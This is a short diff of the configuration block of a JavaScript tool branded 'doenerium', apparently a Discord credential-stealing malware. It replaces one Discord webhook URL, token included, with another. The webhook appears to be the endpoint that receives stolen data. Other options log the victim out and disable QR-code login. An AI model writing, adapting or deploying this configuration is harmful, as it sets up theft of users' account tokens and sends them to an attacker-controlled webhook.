@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "doenerium",
 
-    webhook: "https://discord.com/api/webhooks/987290798947172382/bNf7G4OnttaekjaLFN1tIdPpolV0XOWUllm-2ziPK2QHiwHy8aF30zg6TFtBLgyl5ALw",
+    webhook: "https://discord.com/api/webhooks/988088204819333190/uofSIGuSqxin0jXuM9ZMUM1yxoGFK0nyiJSnN632FhM1r4VBvPuf_BXF3pfoIQQovOWI",
 
     logout: true,
     disable_qr_code: true,
